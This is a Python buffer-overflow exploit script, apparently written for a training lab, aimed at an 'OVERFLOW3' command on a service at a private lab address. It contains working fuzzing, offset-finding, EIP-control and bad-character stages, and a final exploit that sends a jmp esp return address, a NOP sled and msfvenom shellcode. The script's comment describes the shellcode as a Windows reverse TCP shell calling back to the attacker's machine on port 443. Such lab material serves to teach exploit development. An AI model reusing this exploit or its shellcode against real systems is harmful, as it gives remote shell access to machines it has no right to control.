#!/usr/bin/python3

import socket
import sys
from struct import pack

TARGET = "10.10.193.165"
PORT = 1337
OFFSET = 1274 # /usr/bin/msf-pattern_offset -q 35714234

def send_payload(payload, debug=False):
  try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TARGET, PORT))
    s.recv(1024)
    if debug:
      breakpoint()
    s.send(b"OVERFLOW3 " + payload)
    s.close()
  except:
    print("Could not establish a connection")
    sys.exit(0)


def fuzz():
  for i in range(0, 10000, 500):
    buffer = b"A" * i
    print("Fuzzing %s bytes" % i)
    send_payload(buffer, debug=False)

def eip_offset():
  # /usr/bin/msf-pattern_create -l VALUE
  pattern = bytes("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co", "utf-8")

  send_payload(pattern)


def eip_control():
  buffer = b"A" * OFFSET
  eip = b"B" * 4
  payload = buffer + eip

  send_payload(payload)


def bad_chars():
  # \x00\x11\x40\x5f\xb8\xee
  all_chars = bytes([
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
    0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F,
    0x10, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
    0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F,
    0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27,
    0x28, 0x29, 0x2A, 0x2B, 0x2C, 0x2D, 0x2E, 0x2F,
    0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37,
    0x38, 0x39, 0x3A, 0x3B, 0x3C, 0x3D, 0x3E, 0x3F,
    0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47,
    0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E, 0x4F,
    0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57,
    0x58, 0x59, 0x5A, 0x5B, 0x5C, 0x5D, 0x5E,
    0x60, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67,
    0x68, 0x69, 0x6A, 0x6B, 0x6C, 0x6D, 0x6E, 0x6F,
    0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77,
    0x78, 0x79, 0x7A, 0x7B, 0x7C, 0x7D, 0x7E, 0x7F,
    0x80, 0x81, 0x82, 0x83, 0x84, 0x85, 0x86, 0x87,
    0x88, 0x89, 0x8A, 0x8B, 0x8C, 0x8D, 0x8E, 0x8F,
    0x90, 0x91, 0x92, 0x93, 0x94, 0x95, 0x96, 0x97,
    0x98, 0x99, 0x9A, 0x9B, 0x9C, 0x9D, 0x9E, 0x9F,
    0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5, 0xA6, 0xA7,
    0xA8, 0xA9, 0xAA, 0xAB, 0xAC, 0xAD, 0xAE, 0xAF,
    0xB0, 0xB1, 0xB2, 0xB3, 0xB4, 0xB5, 0xB6, 0xB7,
    0xB9, 0xBA, 0xBB, 0xBC, 0xBD, 0xBE, 0xBF,
    0xC0, 0xC1, 0xC2, 0xC3, 0xC4, 0xC5, 0xC6, 0xC7,
    0xC8, 0xC9, 0xCA, 0xCB, 0xCC, 0xCD, 0xCE, 0xCF,
    0xD0, 0xD1, 0xD2, 0xD3, 0xD4, 0xD5, 0xD6, 0xD7,
    0xD8, 0xD9, 0xDA, 0xDB, 0xDC, 0xDD, 0xDE, 0xDF,
    0xE0, 0xE1, 0xE2, 0xE3, 0xE4, 0xE5, 0xE6, 0xE7,
    0xE8, 0xE9, 0xEA, 0xEB, 0xEC, 0xED, 0xEF,
    0xF0, 0xF1, 0xF2, 0xF3, 0xF4, 0xF5, 0xF6, 0xF7,
    0xF8, 0xF9, 0xFA, 0xFB, 0xFC, 0xFD, 0xFE, 0xFF
  ])

  buffer = b"A" * OFFSET
  eip = b"B" * 4
  payload = buffer + eip + all_chars

  send_payload(payload)


def exploit():
  # msfvenom -p 'windows/shell_reverse_tcp' LHOST=$(vpnip) LPORT=443  -f 'python' --bad-chars="\x00\x11\x40\x5f\xb8\xee" --var-name shellcode
  shellcode  = b""
  shellcode += b"\xfc\xbb\xb1\xad\x85\xf0\xeb\x0c\x5e\x56\x31"
  shellcode += b"\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef"
  shellcode += b"\xff\xff\xff\x4d\x45\x07\xf0\xad\x96\x68\x78"
  shellcode += b"\x48\xa7\xa8\x1e\x19\x98\x18\x54\x4f\x15\xd2"
  shellcode += b"\x38\x7b\xae\x96\x94\x8c\x07\x1c\xc3\xa3\x98"
  shellcode += b"\x0d\x37\xa2\x1a\x4c\x64\x04\x22\x9f\x79\x45"
  shellcode += b"\x63\xc2\x70\x17\x3c\x88\x27\x87\x49\xc4\xfb"
  shellcode += b"\x2c\x01\xc8\x7b\xd1\xd2\xeb\xaa\x44\x68\xb2"
  shellcode += b"\x6c\x67\xbd\xce\x24\x7f\xa2\xeb\xff\xf4\x10"
  shellcode += b"\x87\x01\xdc\x68\x68\xad\x21\x45\x9b\xaf\x66"
  shellcode += b"\x62\x44\xda\x9e\x90\xf9\xdd\x65\xea\x25\x6b"
  shellcode += b"\x7d\x4c\xad\xcb\x59\x6c\x62\x8d\x2a\x62\xcf"
  shellcode += b"\xd9\x74\x67\xce\x0e\x0f\x93\x5b\xb1\xdf\x15"
  shellcode += b"\x1f\x96\xfb\x7e\xfb\xb7\x5a\xdb\xaa\xc8\xbc"
  shellcode += b"\x84\x13\x6d\xb7\x29\x47\x1c\x9a\x25\xa4\x2d"
  shellcode += b"\x24\xb6\xa2\x26\x57\x84\x6d\x9d\xff\xa4\xe6"
  shellcode += b"\x3b\xf8\xcb\xdc\xfc\x96\x35\xdf\xfc\xbf\xf1"
  shellcode += b"\x8b\xac\xd7\xd0\xb3\x26\x27\xdc\x61\xe8\x77"
  shellcode += b"\x72\xda\x49\x27\x32\x8a\x21\x2d\xbd\xf5\x52"
  shellcode += b"\x4e\x17\x9e\xf9\xb5\xf0\xab\xf6\x96\x93\xc4"
  shellcode += b"\x0a\xd8\x92\xaf\x82\x3e\xfe\xdf\xc2\xe9\x97"
  shellcode += b"\x46\x4f\x61\x09\x86\x45\x0c\x09\x0c\x6a\xf1"
  shellcode += b"\xc4\xe5\x07\xe1\xb1\x05\x52\x5b\x17\x19\x48"
  shellcode += b"\xf3\xfb\x88\x17\x03\x75\xb1\x8f\x54\xd2\x07"
  shellcode += b"\xc6\x30\xce\x3e\x70\x26\x13\xa6\xbb\xe2\xc8"
  shellcode += b"\x1b\x45\xeb\x9d\x20\x61\xfb\x5b\xa8\x2d\xaf"
  shellcode += b"\x33\xff\xfb\x19\xf2\xa9\x4d\xf3\xac\x06\x04"
  shellcode += b"\x93\x29\x65\x97\xe5\x35\xa0\x61\x09\x87\x1d"
  shellcode += b"\x34\x36\x28\xca\xb0\x4f\x54\x6a\x3e\x9a\xdc"
  shellcode += b"\x9a\x75\x86\x75\x33\xd0\x53\xc4\x5e\xe3\x8e"
  shellcode += b"\x0b\x67\x60\x3a\xf4\x9c\x78\x4f\xf1\xd9\x3e"
  shellcode += b"\xbc\x8b\x72\xab\xc2\x38\x72\xfe\xc2\xbe\x8c"
  shellcode += b"\x01"
  buffer = b"A" * OFFSET
  eip = pack("<L", 0x62501203) # jmp_esp
  nop = b"\x90" * 32
  payload = buffer + eip + nop + shellcode

  send_payload(payload)

#fuzz()
#eip_offset()
#eip_control()
#bad_chars()
exploit()
